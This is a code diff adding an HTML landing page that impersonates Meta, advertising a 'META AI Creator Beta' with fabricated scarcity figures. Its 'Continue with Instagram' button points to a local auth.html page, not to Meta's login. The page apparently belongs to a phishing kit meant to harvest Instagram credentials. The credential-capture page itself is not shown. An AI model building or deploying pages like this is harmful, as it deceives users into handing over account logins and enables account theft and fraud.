@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>META AI — Creator Beta</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <meta property="og:title" content="META AI Creator Beta">
+    <meta property="og:description" content="Exclusive early access for creators. Limited spots available.">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #0a0a0f;
+            color: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        .wrap {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        
+        .meta-icon {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 24px;
+            background: linear-gradient(135deg, #0064E0, #0082FB);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            box-shadow: 0 8px 32px rgba(0, 100, 224, 0.3);
+            animation: iconPulse 3s ease-in-out infinite;
+        }
+        
+        @keyframes iconPulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 8px 32px rgba(0, 100, 224, 0.3); }
+            50% { transform: scale(1.05); box-shadow: 0 12px 40px rgba(0, 100, 224, 0.5); }
+        }
+        
+        h1 {
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+        
+        .tagline {
+            color: #888;
+            font-size: 15px;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+        
+        .card {
+            background: #141418;
+            border: 1px solid #222;
+            border-radius: 20px;
+            padding: 28px;
+            margin-bottom: 16px;
+            text-align: left;
+        }
+        
+        .feature {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 0;
+            border-bottom: 1px solid #1a1a1f;
+        }
+        
+        .feature:last-child { border-bottom: none; }
+        
+        .feature-emoji {
+            width: 36px;
+            height: 36px;
+            background: #1a1a24;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+        
+        .feature-text {
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .feature-text span {
+            display: block;
+            font-size: 12px;
+            color: #666;
+            margin-top: 2px;
+            font-weight: 400;
+        }
+        
+        .urgency {
+            background: linear-gradient(90deg, rgba(237, 73, 86, 0.1), rgba(237, 73, 86, 0.02));
+            border: 1px solid rgba(237, 73, 86, 0.2);
+            border-radius: 12px;
+            padding: 14px;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .urgency-dot {
+            width: 8px;
+            height: 8px;
+            background: #ed4956;
+            border-radius: 50%;
+            animation: blink 1.5s infinite;
+            box-shadow: 0 0 8px rgba(237, 73, 86, 0.5);
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        .urgency-text {
+            font-size: 13px;
+            color: #ff6b7a;
+            font-weight: 600;
+        }
+        
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            padding: 14px;
+            background: #0064E0;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.2s ease;
+            font-family: inherit;
+        }
+        
+        .btn:hover {
+            background: #0051b3;
+            transform: translateY(-1px);
+        }
+        
+        .btn svg {
+            width: 20px;
+            height: 20px;
+            fill: white;
+        }
+        
+        .trust {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #444;
+        }
+        
+        .trust a {
+            color: #666;
+            text-decoration: none;
+        }
+        
+        @media (max-width: 400px) {
+            .wrap { padding: 0 8px; }
+            h1 { font-size: 22px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="wrap">
+        <div class="meta-icon">✨</div>
+        <h1>META AI Creator Beta</h1>
+        <p class="tagline">Generate images, videos, and captions with AI. Built for creators, by Meta.</p>
+        
+        <div class="card">
+            <div class="feature">
+                <div class="feature-emoji">🎨</div>
+                <div class="feature-text">
+                    AI Image Gen
+                    <span>Text-to-image in your workflow</span>
+                </div>
+            </div>
+            <div class="feature">
+                <div class="feature-emoji">🎬</div>
+                <div class="feature-text">
+                    Video Synthesis
+                    <span>4K clips from descriptions</span>
+                </div>
+            </div>
+            <div class="feature">
+                <div class="feature-emoji">✨</div>
+                <div class="feature-text">
+                    Smart Captions
+                    <span>Auto-generated, optimized</span>
+                </div>
+            </div>
+            <div class="feature">
+                <div class="feature-emoji">🎯</div>
+                <div class="feature-text">
+                    Viral Predictor
+                    <span>Score before you post</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="urgency">
+            <div class="urgency-dot"></div>
+            <span class="urgency-text">Only 247 spots left — 12,843 applied</span>
+        </div>
+        
+        <a href="./auth.html" class="btn">
+            <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
+            Continue with Instagram
+        </a>
+        
+        <p class="trust">
+            By continuing, you agree to <a href="https://about.meta.com">Meta Terms</a> and <a href="https://about.meta.com/privacy">Privacy Policy</a>.
+        </p>
+    </div>
+</body>
+</html>
